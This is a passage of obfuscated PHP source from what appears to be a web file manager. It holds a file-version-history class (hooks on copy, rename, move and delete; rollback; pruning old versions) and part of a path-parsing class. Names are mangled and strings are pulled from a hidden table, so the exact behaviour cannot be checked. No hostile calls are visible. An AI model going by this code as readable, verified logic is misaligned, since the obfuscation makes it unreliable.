(!$²ˆÛªçÜ) { return; } self::add($²ˆÛªçÜ); } public static function eventBeforeCopyFile($¢ÜÊÏî¶, $Ñ–ëŸğ©, $ü£Ü»‰è, $¢İà¹µ, $‘ÈÂèÀÆ, $¬„ú‚ï–) { $§òç³€ =& $_SERVER[”øäÃÍª]; if (isset($ü£Ü»‰è->_data[$§òç³€[1293]]) && $ü£Ü»‰è->_data[$§òç³€[1293]]) { return; } $Ö„Ó÷‹„ = $ü£Ü»‰è->getPathOuter($¢İà¹µ); $è«á¾•‹ = self::parsePath($Ö„Ó÷‹„); if (!$è«á¾•‹) { return; } self::add($è«á¾•‹); } public static function eventBeforeRename($¡Ï‘¸Óé) { $´ß¡·¦¯ =& $_SERVER[”øäÃÍª]; $“Ü¹ÚÔÈ = self::parsePath($¡Ï‘¸Óé[0]); if (!$“Ü¹ÚÔÈ) { return; } $ªÃÜ±ùñ = self::checkInHistory($“Ü¹ÚÔÈ); if (!$ªÃÜ±ùñ) { return; } if ($ªÃÜ±ùñ[$´ß¡·¦¯[33]] == $´ß¡·¦¯[230]) { $Æ¯‡ÃÈÕ = self::listData($“Ü¹ÚÔÈ); if ($Æ¯‡ÃÈÕ && $Æ¯‡ÃÈÕ[$´ß¡·¦¯[446]]) { self::moveHistory($“Ü¹ÚÔÈ, $¡Ï‘¸Óé[1]); } } else { IO::rename($ªÃÜ±ùñ[$´ß¡·¦¯[87]], $¡Ï‘¸Óé[1]); } } public static function eventBeforeMove($Û»ìª²) { $ŸĞ·Ìş =& $_SERVER[”øäÃÍª]; $ÈÔ Ëâ¤ = self::parsePath($Û»ìª²[0]); if (!$ÈÔ Ëâ¤) { return; } $åÕâúæŒ = self::parsePath($Û»ìª²[1]); if (!$åÕâúæŒ) { return; } $ñ˜¥ı = $Û»ìª²[3]; $µ¯šù±¦ = self::checkInHistory($ÈÔ Ëâ¤); if (!$µ¯šù±¦) { return; } $Æ«å¹Ó« = self::pathHistory($åÕâúæŒ); if ($µ¯šù±¦[$ŸĞ·Ìş[33]] == $ŸĞ·Ìş[230]) { $Ããˆ•ö = self::listData($ÈÔ Ëâ¤); $²”ª³Ù£ = rtrim($åÕâúæŒ, $ŸĞ·Ìş[8]) . $ŸĞ·Ìş[8] . ($ñ˜¥ı ? $ñ˜¥ı : get_path_this($ÈÔ Ëâ¤)); $ã½Á–Ø¶ = self::listData($²”ª³Ù£); if ($Ããˆ•ö && $Ããˆ•ö[$ŸĞ·Ìş[446]] && $ã½Á–Ø¶ && $ã½Á–Ø¶[$ŸĞ·Ìş[446]]) { return self::clear($ÈÔ Ëâ¤); } if ($Ããˆ•ö && $Ããˆ•ö[$ŸĞ·Ìş[446]]) { self::moveHistory($ÈÔ Ëâ¤, $ñ˜¥ı, $Æ«å¹Ó«); } } else { IO::move($µ¯šù±¦[$ŸĞ·Ìş[87]], $Æ«å¹Ó«, !1, $ñ˜¥ı); self::clearEmptyFolder(IO::pathFather($µ¯šù±¦[$ŸĞ·Ìş[87]])); } } public static function eventAfterRemove($µ…¨¯…, $ÙÃ–©ü) { $ß™Åœ§ =& $_SERVER[”øäÃÍª]; if (!$ÙÃ–©ü) { return; } $†Ÿ‚º÷ = self::parsePath($µ…¨¯…[0]); if (!$†Ÿ‚º÷) { return; } $±¤É´¯ = self::checkInHistory($†Ÿ‚º÷); if (!$±¤É´¯) { return; } if ($±¤É´¯[$ß™Åœ§[33]] == $ß™Åœ§[230]) { $¹ãÛÌ“ = self::listData($†Ÿ‚º÷, !1); if ($¹ãÛÌ“ && $¹ãÛÌ“[$ß™Åœ§[446]]) { self::clear($†Ÿ‚º÷, !1); } } else { IO::remove($±¤É´¯[$ß™Åœ§[87]]); self::clearEmptyFolder(IO::pathFather($±¤É´¯[$ß™Åœ§[87]])); } } private static function checkInHistory($µÀèìÕİ) { $ıî˜°ëˆ = self::pathHistory($µÀèìÕİ); if (!IO::exist($ıî˜°ëˆ)) { $ıî˜°ëˆ .= $_SERVER[”øäÃÍª][1374]; } return IO::exist($ıî˜°ëˆ) ? IO::info($ıî˜°ëˆ) : !1; } private static function parsePath($×ŒÈÓÑô) { $Öáé”åº =& $_SERVER[”øäÃÍª]; if (!$×ŒÈÓÑô) { return !1; } if (isset($GLOBALS[$Öáé”åº[1375]]) && $GLOBALS[$Öáé”åº[1375]]) { return; } $íõ¾øÛî = KodIO::parse($×ŒÈÓÑô); $»ñšßœ = $íõ¾øÛî[$Öáé”åº[33]]; $§Øèòæá = !$»ñšßœ || $»ñšßœ == KodIO::KOD_IO || $»ñšßœ == KodIO::KOD_SHARE_ITEM; if (!$§Øèòæá || !$íõ¾øÛî[$Öáé”åº[1376]]) { return !1; } if (substr($×ŒÈÓÑô, 0, strlen(DATA_PATH . $Öáé”åº[1377])) == DATA_PATH . $Öáé”åº[1377]) { return !1; } if ($»ñšßœ == KodIO::KOD_SHARE_ITEM) { $‰¦ÊÏÂø = IO::init($×ŒÈÓÑô); if ($‰¦ÊÏÂø->pathParse[$Öáé”åº[1289]]) { return self::parsePath($‰¦ÊÏÂø->pathParse[$Öáé”åº[1289]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $í›™‘… = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $Öáé”åº[1378]); foreach ($í›™‘… as $ƒ×Šã»¤) { if (!$»ñšßœ && substr($×ŒÈÓÑô, 0, strlen($ƒ×Šã»¤)) == $ƒ×Šã»¤) { return !1; } } self::log($GLOBALS[$Öáé”åº[1283]] . $Öáé”åº[1379] . $×ŒÈÓÑô); return $×ŒÈÓÑô; } private static function pathHistory($×ÁµıÃ) { $ ÂƒöÔ× =& $_SERVER[”øäÃÍª]; $ÎÅüÒ‹š = self::$_historyBase . ltrim(KodIO::clear($×ÁµıÃ), $ ÂƒöÔ×[8]); $ÎÅüÒ‹š = str_replace(array($ ÂƒöÔ×[1380]), array($ ÂƒöÔ×[1381]), $ÎÅüÒ‹š); return $ÎÅüÒ‹š; } public static function log($è­¸âÕ) { } public static function historyCount($Á”×¶ãæ) { $Õ„ñ–¤… =& $_SERVER[”øäÃÍª]; $£ñ¼×³÷ = array(); $ƒ¸ˆğúã = array(); foreach ($Á”×¶ãæ as $—Í´‘¶) { $«ç£İÆô = get_path_father($—Í´‘¶); if (!$ƒ¸ˆğúã[$«ç£İÆô]) { $ƒ¸ˆğúã[$«ç£İÆô] = array(); } $ƒ¸ˆğúã[$«ç£İÆô][] = get_path_this($—Í´‘¶); } foreach ($ƒ¸ˆğúã as $«ç£İÆô => $ª¦ àõ) { $’Ê††ñÑ = self::parsePath($«ç£İÆô); if (!$’Ê††ñÑ) { continue; } foreach ($ª¦ àõ as $ù”»áü›) { $é“ĞÏÙ = self::listData(rtrim($’Ê††ñÑ, $Õ„ñ–¤…[8]) . $Õ„ñ–¤…[8] . $ù”»áü›, !1); if ($é“ĞÏÙ && $é“ĞÏÙ[$Õ„ñ–¤…[446]]) { $£ñ¼×³÷[rtrim($«ç£İÆô, $Õ„ñ–¤…[8]) . $Õ„ñ–¤…[8] . $ù”»áü›] = count($é“ĞÏÙ[$Õ„ñ–¤…[446]]); } } } return $£ñ¼×³÷; } public static function add($ü÷Å¿üë) { $’³Ó±ãÒ =& $_SERVER[”øäÃÍª]; $µİ£Ú¢û = self::listData($ü÷Å¿üë); if (!$µİ£Ú¢û) { return; } $ˆ³È¥ß = Model($’³Ó±ãÒ[882])->get($’³Ó±ãÒ[1382]); $ß¿Š¶—µ = intval($GLOBALS[$’³Ó±ãÒ[6]][$’³Ó±ãÒ[92]][$’³Ó±ãÒ[1360]]); $¨ŸÒšÈë = $ˆ³È¥ß == $’³Ó±ãÒ[1383] ? min(5, $ß¿Š¶—µ) : $ß¿Š¶—µ; if ($ß¿Š¶—µ <= 0) { return; } $¿›µã• = IO::info($ü÷Å¿üë); $ğ¡ËŒ¨Ñ = $µİ£Ú¢û[$’³Ó±ãÒ[446]]; if ($¿›µã•[$’³Ó±ãÒ[79]] == 0) { return; } if ($¿›µã•[$’³Ó±ãÒ[79]] >= 1024 * 1024 * 500) { return !1; } $»¬²²–  = IO::hashSimple($ü÷Å¿üë); if ($ğ¡ËŒ¨Ñ && $ğ¡ËŒ¨Ñ[0][$’³Ó±ãÒ[702]] == $»¬²²– ) { return !0; } if (array_key_exists($’³Ó±ãÒ[233], $¿›µã•) && !$¿›µã•[$’³Ó±ãÒ[233]]) { return !1; } $õËÙ‹· = short_id(time()); $–÷ê¼‚ = array($’³Ó±ãÒ[487] => $õËÙ‹·, $’³Ó±ãÒ[702] => $»¬²²– , $’³Ó±ãÒ[32] => $¿›µã•[$’³Ó±ãÒ[32]] . $’³Ó±ãÒ[10] . date($’³Ó±ãÒ[1384]) . rand_string(1), $’³Ó±ãÒ[79] => $¿›µã•[$’³Ó±ãÒ[79]], $’³Ó±ãÒ[549] => USER_ID, $’³Ó±ãÒ[231] => time(), $’³Ó±ãÒ[1385] => $’³Ó±ãÒ[12]); IO::mkdir($µİ£Ú¢û[$’³Ó±ãÒ[1386]]); $ÁˆÄÚÆÑ = IO::copy($ü÷Å¿üë, $µİ£Ú¢û[$’³Ó±ãÒ[1386]], !1, $–÷ê¼‚[$’³Ó±ãÒ[32]]); if (!$ÁˆÄÚÆÑ) { self::clearEmptyFolder($µİ£Ú¢û[$’³Ó±ãÒ[1386]]); return !1; } array_unshift($ğ¡ËŒ¨Ñ, $–÷ê¼‚); if (count($ğ¡ËŒ¨Ñ) > $¨ŸÒšÈë) { $‹§¢Ê‘ã = array_slice($ğ¡ËŒ¨Ñ, $¨ŸÒšÈë); foreach ($‹§¢Ê‘ã as $ÇÀºÍ¬ğ) { IO::remove($µİ£Ú¢û[$’³Ó±ãÒ[1386]] . $ÇÀºÍ¬ğ[$’³Ó±ãÒ[32]]); } $ğ¡ËŒ¨Ñ = array_slice($ğ¡ËŒ¨Ñ, 0, $¨ŸÒšÈë); } return self::saveData($µİ£Ú¢û[$’³Ó±ãÒ[1387]], $ğ¡ËŒ¨Ñ); } public static function remove($Øˆ½¼É, $Áó‡˜ûÚ) { $Õœİ¯ş‚ =& $_SERVER[”øäÃÍª]; $Šäšµ– = self::listData($Øˆ½¼É); $¿•ÊùĞ¹ = array(); if (!$Šäšµ–) { return !1; } foreach ($Šäšµ–[$Õœİ¯ş‚[446]] as $œ§æÕ¯Ö) { if ($œ§æÕ¯Ö[$Õœİ¯ş‚[487]] == $Áó‡˜ûÚ) { IO::remove($Šäšµ–[$Õœİ¯ş‚[1386]] . $œ§æÕ¯Ö[$Õœİ¯ş‚[32]]); continue; } $¿•ÊùĞ¹[] = $œ§æÕ¯Ö; } return self::saveData($Šäšµ–[$Õœİ¯ş‚[1387]], $¿•ÊùĞ¹); } public static function clear($Âë–Òé‹, $ÌõèÃ“ = true) { $½İê³ï =& $_SERVER[”øäÃÍª]; $ï’õÛÑî = self::listData($Âë–Òé‹, $ÌõèÃ“); if (!$ï’õÛÑî) { return !1; } foreach ($ï’õÛÑî[$½İê³ï[446]] as $Æòı¹ª) { IO::remove($ï’õÛÑî[$½İê³ï[1386]] . $Æòı¹ª[$½İê³ï[32]]); } return self::saveData($ï’õÛÑî[$½İê³ï[1387]], array()); } public static function moveHistory($íÇ€ıôÌ, $ÛÃçÆù¨ = '', $”ìÓí´Ì = '') { $½—ˆ‘ø‚ =& $_SERVER[”øäÃÍª]; $Ÿ›ìàå÷ = self::listData($íÇ€ıôÌ, !1); if (!$Ÿ›ìàå÷ || !$Ÿ›ìàå÷[$½—ˆ‘ø‚[446]]) { return !1; } $ùØ—ÁÑã = $½—ˆ‘ø‚[1374]; $ÛÃçÆù¨ = $ÛÃçÆù¨ ? $ÛÃçÆù¨ : get_path_this($íÇ€ıôÌ); $”ìÓí´Ì = $”ìÓí´Ì ? $”ìÓí´Ì : $Ÿ›ìàå÷[$½—ˆ‘ø‚[1386]]; $ºàˆÑ¸Â = substr(get_path_this($Ÿ›ìàå÷[$½—ˆ‘ø‚[1387]]), 0, -strlen($ùØ—ÁÑã)); foreach ($Ÿ›ìàå÷[$½—ˆ‘ø‚[446]] as $²—½ò­ => $ÔºÍ„Ô) { $Â×ËÈ—Œ = $ÛÃçÆù¨ . substr($ÔºÍ„Ô[$½—ˆ‘ø‚[32]], strlen($ºàˆÑ¸Â)); $…ÒÈ÷ªÑ = IO::move($Ÿ›ìàå÷[$½—ˆ‘ø‚[1386]] . $ÔºÍ„Ô[$½—ˆ‘ø‚[32]], $”ìÓí´Ì, !1, $Â×ËÈ—Œ); if ($…ÒÈ÷ªÑ) { $Ÿ›ìàå÷[$½—ˆ‘ø‚[446]][$²—½ò­][$½—ˆ‘ø‚[32]] = $Â×ËÈ—Œ; } } $Ÿ›ìàå÷[$½—ˆ‘ø‚[1387]] = IO::move($Ÿ›ìàå÷[$½—ˆ‘ø‚[1387]], $”ìÓí´Ì, !1, $ÛÃçÆù¨ . $ùØ—ÁÑã); self::saveData($Ÿ›ìàå÷[$½—ˆ‘ø‚[1387]], $Ÿ›ìàå÷[$½—ˆ‘ø‚[446]]); self::clearEmptyFolder($Ÿ›ìàå÷[$½—ˆ‘ø‚[1386]]); } public static function rollback($ôÊğè¤¤, $²ıÑğ¹¹) { $ûİ´¼—ß =& $_SERVER[”øäÃÍª]; $æ‰›º¡ = self::listData($ôÊğè¤¤); if (!$æ‰›º¡) { return; } $ÀøéŞ¤¬ = IO::info($ôÊğè¤¤); foreach ($æ‰›º¡[$ûİ´¼—ß[446]] as $®ù˜øéï => $ÇÅÔò) { if ($ÇÅÔò[$ûİ´¼—ß[487]] == $²ıÑğ¹¹) { self::add($ôÊğè¤¤); $¨…¨À±ª = $æ‰›º¡[$ûİ´¼—ß[1386]] . $ÇÅÔò[$ûİ´¼—ß[32]]; $æ¨´ú¶ = IO::copy($¨…¨À±ª, IO::pathFather($ôÊğè¤¤), REPEAT_REPLACE, $ÀøéŞ¤¬[$ûİ´¼—ß[32]]); if ($æ¨´ú¶) { self::remove($ôÊğè¤¤, $²ıÑğ¹¹); } return $æ¨´ú¶; } } return !1; } public static function setDetail($¯èëâœÉ, $ãøÔ–™¤, $ø‰®ª) { $œº”§ø½ =& $_SERVER[”øäÃÍª]; $ì²ÏÓà« = self::listData($¯èëâœÉ); if (!$ì²ÏÓà«) { return; } foreach ($ì²ÏÓà«[$œº”§ø½[446]] as $À©öÄôÏ => $šª¿èåË) { if ($šª¿èåË[$œº”§ø½[487]] == $ãøÔ–™¤) { $ì²ÏÓà«[$œº”§ø½[446]][$À©öÄôÏ][$œº”§ø½[1385]] = $ø‰®ª; self::saveData($ì²ÏÓà«[$œº”§ø½[1387]], $ì²ÏÓà«[$œº”§ø½[446]]); return !0; } } return !1; } public static function fileInfo($«ş‘ûƒ, $Õõ¸ù•¡) { $‡¬›‹ã =& $_SERVER[”øäÃÍª]; $•ÆÏ¹¥ = self::listData($«ş‘ûƒ); if (!$•ÆÏ¹¥) { show_json(LNG($‡¬›‹ã[105]), !1); } $Ö¯ãÕÖ = $‡¬›‹ã[12]; foreach ($•ÆÏ¹¥[$‡¬›‹ã[446]] as $¨À™ Àà => $éÂÓ‘ôÄ) { if ($éÂÓ‘ôÄ[$‡¬›‹ã[487]] != $Õõ¸ù•¡) { continue; } $Ö¯ãÕÖ = $•ÆÏ¹¥[$‡¬›‹ã[1386]] . $éÂÓ‘ôÄ[$‡¬›‹ã[32]]; break; } if (!$Ö¯ãÕÖ) { show_json(LNG($‡¬›‹ã[105]), !1); } return IO::info($Ö¯ãÕÖ); } public static function fileOut($üĞ¡ì«ò, $àÚ¹¸Ä, $«á”¬¿È = false) { $ÏµĞËÇÄ =& $_SERVER[”øäÃÍª]; $˜âî´¬€ = self::fileInfo($üĞ¡ì«ò, $àÚ¹¸Ä); $©ó™«™ =& $GLOBALS[$ÏµĞËÇÄ[7]]; $«á”¬¿È = isset($©ó™«™[$ÏµĞËÇÄ[1337]]) && $©ó™«™[$ÏµĞËÇÄ[1337]] == 1; if (isset($©ó™«™[$ÏµĞËÇÄ[33]]) && $©ó™«™[$ÏµĞËÇÄ[33]] == $ÏµĞËÇÄ[1388]) { return IO::fileOutImage($˜âî´¬€[$ÏµĞËÇÄ[87]], $©ó™«™[$ÏµĞËÇÄ[1389]]); } IO::fileOut($˜âî´¬€[$ÏµĞËÇÄ[87]], $«á”¬¿È, get_path_this($üĞ¡ì«ò)); } public static function listData($æÕ‡®¬š, $¶¡ä–Û = true) { $¢ì°©ª‘ =& $_SERVER[”øäÃÍª]; if ($¶¡ä–Û && !IO::exist($æÕ‡®¬š)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($æÕ‡®¬š, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $”ıÅ‘¼º = self::pathHistory($æÕ‡®¬š); $éû÷«Æ = array($¢ì°©ª‘[1387] => $”ıÅ‘¼º . $¢ì°©ª‘[1374], $¢ì°©ª‘[1386] => rtrim(get_path_father($”ıÅ‘¼º), $¢ì°©ª‘[8]) . $¢ì°©ª‘[8], $¢ì°©ª‘[446] => array()); $ŞŞ†õĞ¬ = IO::getContent($éû÷«Æ[$¢ì°©ª‘[1387]]); if ($ŞŞ†õĞ¬) { $öñÆ»² = json_decode($ŞŞ†õĞ¬, !0); if (is_array($öñÆ»²)) { $éû÷«Æ[$¢ì°©ª‘[446]] = $öñÆ»²; } } return $éû÷«Æ; } private static function saveData($ÔÏŞĞÔÎ, $•±Â÷ü) { $³‚¡Ş¡ =& $_SERVER[”øäÃÍª]; self::log($³‚¡Ş¡[1390] . $ÔÏŞĞÔÎ . $³‚¡Ş¡[74] . count($•±Â÷ü), $³‚¡Ş¡[861]); if ($•±Â÷ü) { return IO::setContent($ÔÏŞĞÔÎ, json_encode($•±Â÷ü)); } $§•ÌñÅ¥ = IO::pathFather($ÔÏŞĞÔÎ); IO::remove($ÔÏŞĞÔÎ); self::clearEmptyFolder($§•ÌñÅ¥); return !0; } public static function clearEmptyFolder($©¢ûğñ©) { $ÛıÂ’Öö =& $_SERVER[”øäÃÍª]; if (trim($©¢ûğñ©, $ÛıÂ’Öö[8]) == trim(self::$_historyBase, $ÛıÂ’Öö[8])) { return; } $²ôÍ¶ò¬ = IO::pathFather($©¢ûğñ©); $¼ø»¶äœ = IO::has($©¢ûğñ©, !0); if ($¼ø»¶äœ[$ÛıÂ’Öö[239]] > 0 || $¼ø»¶äœ[$ÛıÂ’Öö[240]] > 0) { return; } IO::remove($©¢ûğñ©); self::clearEmptyFolder($²ôÍ¶ò¬); } private static function getBasePath() { $çüÉ°º‚ =& $_SERVER[”øäÃÍª]; $°Ê‰¦¬¿ = Model($çüÉ°º‚[1391])->get($çüÉ°º‚[1392]); if ($°Ê‰¦¬¿) { if (!IO::exist($°Ê‰¦¬¿)) { IO::mkdir($°Ê‰¦¬¿); } if (get_path_this($°Ê‰¦¬¿) == $çüÉ°º‚[1377]) { $Ûˆºã»Ï = $çüÉ°º‚[1393] . rand_string(8); @rename($°Ê‰¦¬¿, get_path_father($°Ê‰¦¬¿) . $çüÉ°º‚[8] . $Ûˆºã»Ï); $°Ê‰¦¬¿ = DATA_PATH . $Ûˆºã»Ï . $çüÉ°º‚[8]; file_put_contents(DATA_PATH . $çüÉ°º‚[1325], $çüÉ°º‚[12]); Model($çüÉ°º‚[1391])->set($çüÉ°º‚[1392], $°Ê‰¦¬¿); } return $°Ê‰¦¬¿; } $°Ê‰¦¬¿ = DATA_PATH . $çüÉ°º‚[1393] . rand_string(8) . $çüÉ°º‚[8]; $°Ê‰¦¬¿ = IO::mkdir($°Ê‰¦¬¿); $°Ê‰¦¬¿ = rtrim($°Ê‰¦¬¿, $çüÉ°º‚[8]) . $çüÉ°º‚[8]; file_put_contents($°Ê‰¦¬¿ . $çüÉ°º‚[1325], $çüÉ°º‚[12]); file_put_contents(DATA_PATH . $çüÉ°º‚[1325], $çüÉ°º‚[12]); Model($çüÉ°º‚[1391])->set($çüÉ°º‚[1392], $°Ê‰¦¬¿); return $°Ê‰¦¬¿; } } class KodIO { const KOD_SOURCE = "\x7b\163\157\165\x72\143\145\175"; const KOD_USER_RECYCLE = "\173\165\x73\145\162\x52\145\143\171\143\154\145\175"; const KOD_USER_FAV = "\173\x75\163\x65\x72\106\x61\166\175"; const KOD_USER_FILE_TAG = "\173\x75\163\145\162\106\x69\x6c\x65\x54\x61\x67\x7d"; const KOD_USER_FILE_TYPE = "\173\165\x73\145\162\106\x69\x6c\x65\x54\x79\160\145\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\147\162\x6f\x75\x70\122\157\157\164\123\x65\x6c\x66\175"; const KOD_USER_SHARE = "\x7b\165\x73\x65\162\x53\150\x61\x72\145\175"; const KOD_USER_SHARE_LINK = "\173\x75\x73\x65\162\123\150\x61\x72\x65\x4c\x69\x6e\153\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\163\150\141\x72\145\124\157\x4d\145\175"; const KOD_SHARE_ITEM = "\x7b\163\150\141\x72\x65\x49\164\145\x6d\175"; const KOD_SHARE_LINK = "\x7b\x73\150\x61\x72\145\x49\164\145\x6d\x4c\x69\x6e\153\x7d"; const KOD_SHARE_OUTER = "\x7b\x73\150\141\162\x65\111\x74\145\155\x4f\165\x74\x7d"; const KOD_SEARCH = "\x7b\163\x65\141\162\x63\150\x7d"; const KOD_BLOCK = "\x7b\142\x6c\157\x63\x6b\175"; const KOD_IO = "\x7b\x69\157\175"; const KOD_USER_RECENT = "\173\165\x73\x65\162\x52\x65\156\x63\x65\156\164\x7d"; const KOD_USER_DRIVER = "\173\144\162\151\166\x65\x72\x7d"; public static function typeList() { $Ñú»«£¼ =& $_SERVER[”øäÃÍª]; return array($Ñú»«£¼[1394] => self::KOD_SOURCE, $Ñú»«£¼[1395] => self::KOD_USER_RECYCLE, $Ñú»«£¼[1396] => self::KOD_USER_FAV, $Ñú»«£¼[1397] => self::KOD_USER_FILE_TAG, $Ñú»«£¼[1398] => self::KOD_USER_FILE_TYPE, $Ñú»«£¼[1399] => self::KOD_GROUP_ROOT_SELF, $Ñú»«£¼[1400] => self::KOD_USER_SHARE, $Ñú»«£¼[1401] => self::KOD_USER_SHARE_LINK, $Ñú»«£¼[1402] => self::KOD_USER_SHARE_TO_ME, $Ñú»«£¼[1403] => self::KOD_SHARE_ITEM, $Ñú»«£¼[1404] => self::KOD_SHARE_LINK, $Ñú»«£¼[1405] => self::KOD_SHARE_OUTER, $Ñú»«£¼[1406] => self::KOD_SEARCH, $Ñú»«£¼[1407] => self::KOD_BLOCK, $Ñú»«£¼[1408] => self::KOD_IO, $Ñú»«£¼[1409] => self::KOD_USER_RECENT, $Ñú»«£¼[1410] => self::KOD_USER_DRIVER); } public static function parse($ÈçÅßœ) { $€ÍìöÌñ =& $_SERVER[”øäÃÍª]; $ÈçÅßœ = self::clear($ÈçÅßœ); $ şøÁŒ… = array_values(self::typeList()); preg_match($€ÍìöÌñ[1411], $ÈçÅßœ, $¯óí¤æ); $ùÙ÷…”ø = array($€ÍìöÌñ[519] => !1, $€ÍìöÌñ[1412] => !1, $€ÍìöÌñ[516] => !1, $€ÍìöÌñ[87] => $ÈçÅßœ, $€ÍìöÌñ[1309] => !1, $€ÍìöÌñ[1308] => $€ÍìöÌñ[12]); if (is_array($¯óí¤æ) && count($¯óí¤æ) == 5) { $¬¡®öÖˆ = $€ÍìöÌñ[1413] . $¯óí¤æ[2] . $€ÍìöÌñ[402]; if (in_array($¬¡®öÖˆ, $ şøÁŒ…)) { $ùÙ÷…”ø[$€ÍìöÌñ[1309]] = $¯óí¤æ[1]; $ùÙ÷…”ø[$€ÍìöÌñ[33]] = $¬¡®öÖˆ; $ùÙ÷…”ø[$€ÍìöÌñ[1414]] = substr($¬¡®öÖˆ, 1, -1); $ùÙ÷…”ø[$€ÍìöÌñ[487]] = $¯óí¤æ[3]; } $ùÙ÷…”ø[$€ÍìöÌñ[1308]] = $¯óí¤æ[4]; } if ($ùÙ÷…”ø[$€ÍìöÌñ[519]] == self::KOD_SOURCE) { $ùÙ÷…”ø[$€ÍìöÌñ[487]] = intval($ùÙ÷…”ø[$€ÍìöÌñ[487]]); $ùÙ÷…”ø[$€ÍìöÌñ[1312]] = $ùÙ÷…”ø[$€ÍìöÌñ[487]]; } $œåöÍæ = array($€ÍìöÌñ[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_SHARE_OUTER, self::KOD_USER_DRIVER); $ùÙ÷…”ø[$€ÍìöÌñ[1376]] = in_array($ùÙ÷…”ø[$€ÍìöÌñ[33]], $œåöÍæ); return $ùÙ÷…”ø; } public static function isTruePath($ÁÏê´) { $À±ßâ”Ù =& $_SERVER[”øäÃÍª]; if (substr($ÁÏê´, 0, 1) != $À±ßâ”Ù[1413]) { return !0; } if (strpos($ÁÏê´, $À±ßâ”Ù[506]) === 0) { return !0; } if (strpos($ÁÏê´, $À±ßâ”Ù[1380]) === 0) { return !0; } if (strpos($ÁÏê´, $À±ßâ”Ù[1415]) === 0) { return !0; } if (strpos($ÁÏê´, $À±ßâ”Ù[1416]) === 0) { return !0; } if (strpos($ÁÏê´, $À±ßâ”Ù[1417]) === 0) { return !0; } if (strpos($ÁÏê´, $À±ßâ”Ù[1418]) === 0) { return !0; } return !1; } public static function clear($êëÚºü½) { $Ûˆ¯£ =& $_SERVER[”øäÃÍª]; $êëÚºü½ = str_replace(array($Ûˆ¯£[1202], $Ûˆ¯£[285]), $Ûˆ¯£[53], $êëÚºü½); $êëÚºü½ = str_replace($Ûˆ¯£[97], $Ûˆ¯£[8], $êëÚºü½); $Í¯“âƒÌ = $Ûˆ¯£[1419]; if (substr($êëÚºü½, 0, 3) == $Ûˆ¯£[1420]) { $êëÚºü½ = substr($êëÚºü½, 3); } while (strstr($êëÚºü½, $Í¯“âƒÌ)) { $êëÚºü½ = str_replace($Í¯“âƒÌ, $Ûˆ¯£[8], $êëÚºü½); } $êëÚºü½ = preg_replace($Ûˆ¯£[1421], $Ûˆ¯£[8], $êëÚºü½); if ($êëÚºü½ == $Ûˆ¯£[8]) { return $Ûˆ¯£[8]; } $êëÚºü½ = rtrim($êëÚºü½, $Ûˆ¯£[8]); return $êëÚºü½; } public static function pathTrue($Ïæ¤¨®ê) { $¢¥ô€³ô =& $_SERVER[”øäÃÍª]; if (!$Ïæ¤¨®ê) { return $¢¥ô€³ô[12]; } $Ïæ¤¨®ê = str_replace($¢¥ô€³ô[254], $¢¥ô€³ô[8], str_replace($¢¥ô€³ô[1422], $¢¥ô€³ô[8], $Ïæ¤¨®ê)); $Ïæ¤¨®ê = str_replace($¢¥ô€³ô[254], $¢¥ô€³ô[8], str_replace($¢¥ô€³ô[1422], $¢¥ô€³ô[8], $Ïæ¤¨®ê)); if (!strstr($Ïæ¤¨®ê, $¢¥ô€³ô[1420])) { return $Ïæ¤¨®ê; } $ìä¶‡êâ = explode($¢¥ô€³ô[8], $Ïæ¤¨®ê); foreach ($ìä¶‡êâ as $×–Š€Ä => $ÉŞãşŸÑ) { if ($ÉŞãşŸÑ !== $¢¥ô€³ô[1423]) { continue; } for ($‘„µöìá = $×–Š€Ä; $‘„µöìá >= 0; $‘„µöìá--) { if ($ìä¶‡êâ[$‘„µöìá] === $¢¥ô€³ô[10] || $ìä¶‡êâ[$‘„µöìá] === $¢¥ô€³ô[1423] || $ìä¶‡êâ[$‘„µöìá] === -1) { continue; } if ($ìä¶‡êâ[$‘„µöìá] === $¢¥ô€³ô[12]) { $ìä¶‡êâ[$×–Š€Ä] = -1; break; } $ìä¶‡êâ[$×–Š€Ä] = -1; $ìä¶‡êâ[$‘„µöìá] = -1; break; } } $‘š¨Ï¾ = array(); foreach ($ìä¶‡êâ as $ÉŞãşŸÑ) { if ($ÉŞãşŸÑ !== -1) { $‘š¨Ï¾[] = $ÉŞãşŸÑ; } } $î¢Ï°–¼ = implode($¢¥ô€³ô[8], $‘š¨Ï¾); if (strpos($î¢Ï°–¼, $¢¥ô€³ô[1424]) === 0) { $î¢Ï°–¼ = $¢¥ô€³ô[1420] . substr($î¢Ï°–¼, strlen($¢¥ô€³ô[1424])); } return $î¢Ï°–¼; } public static function pathUrlClear($º¾¿´Ó†) { $°õ”¥³± =& $_SERVER[”øäÃÍª]; if (!$º¾¿´Ó†) { return $º¾¿´Ó†; } $º¾¿´Ó† = rawurldecode($º¾¿´Ó†); $º¾¿´Ó† = str_replace($°õ”¥³±[1422], $°õ”¥³±[8], $º¾¿´Ó†); if (strpos($º¾¿´Ó†, $°õ”¥³±[76]) > 0) { $º¾¿´Ó† = substr($º¾¿´Ó†, 0, strpos($º¾¿´Ó†, $°õ”¥³±[76])); } if (strpos($º¾¿´Ó†, $°õ”¥³±[1425]) > 0) { $º¾¿´Ó† = substr($º¾¿´Ó†, 0, strpos($º¾¿´Ó†, $°õ”¥³±[1425])); } return $º¾¿´Ó†; } public static function sourceID($Øïùé) { $¾øÕä½ =& $_SERVER[”øäÃÍª]; $ÚóƒŞ‰ê = self::parse($Øïùé); if ($ÚóƒŞ‰ê[$¾øÕä½[33]] !== self::KOD_SOURCE) { show_json(LNG($¾øÕä½[1426]), !1); } return $ÚóƒŞ‰ê[$¾øÕä½[487]]; } public static function make($‡˜ùç‘) { if (!$‡˜ùç‘) { return !1; } return self::makePath(self::KOD_SOURCE, intval($‡˜ùç‘)); } public static function makeShare($œê¹˜»õ, $ï„ãÉ„™) { return self::makePath(self::KOD_SHARE_ITEM, $œê¹˜»õ, $ï„ãÉ„™); } public static function makeFileTypePath($éáˆÕ¹‰) { return self::makePath(self::KOD_USER_FILE_TYPE, $éáˆÕ¹‰); } public static function makeFileTagPath($ÆªŸóœ¶) { return 